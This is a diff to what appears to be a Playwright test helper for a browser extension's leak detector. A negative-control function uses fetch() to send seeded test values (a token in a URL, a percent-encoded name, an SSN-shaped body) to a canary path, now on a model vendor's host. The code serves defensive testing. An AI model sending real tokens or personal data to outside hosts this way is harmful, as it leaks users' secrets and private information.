@@ -5,6 +5,7 @@
  */
 import type { Page, Worker } from '@playwright/test';
 
+import { BYO_VENDORS } from '../../../src/config';
 import { loadSeeds, type Seed } from './leaks';
 
 const SEEDS = loadSeeds();
@@ -55,19 +56,26 @@ export async function plantInConsole(worker: Worker): Promise<void> {
 
 /**
  * The negative control's plants into the network, from an extension page: a token in a URL, a name
- * percent-encoded character by character, an SSN in a body.
+ * percent-encoded character by character, an SSN in a body. They go to a host the extension's content security policy
+ * lets it reach (a model vendor's, wxt.config.ts `connectSources`), since Chrome refuses any other before a request is
+ * made (Sprint 5 close, SEC-3).
  */
 export async function plantInNetwork(page: Page): Promise<void> {
   await page.evaluate(
-    ([token, name, ssn]) => {
+    ([host, token, name, ssn]) => {
       const encoded = Array.from(name, (c) => `%${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join('');
       return Promise.all([
-        fetch(`https://canary.example.com/?q=${token}`).catch(() => undefined),
-        fetch(`https://canary.example.com/?n=${encoded}`).catch(() => undefined),
-        fetch('https://canary.example.com/', { method: 'POST', body: ssn }).catch(() => undefined),
+        fetch(`https://${host}/attest-canary?q=${token}`).catch(() => undefined),
+        fetch(`https://${host}/attest-canary?n=${encoded}`).catch(() => undefined),
+        fetch(`https://${host}/attest-canary`, { method: 'POST', body: ssn }).catch(() => undefined),
       ]);
     },
-    [seed('url_with_token').value, seed('person_name_2').value, seed('ssn_shape').value] as const,
+    [
+      new URL(BYO_VENDORS.openai.endpoint).host,
+      seed('url_with_token').value,
+      seed('person_name_2').value,
+      seed('ssn_shape').value,
+    ] as const,
   );
 }
 
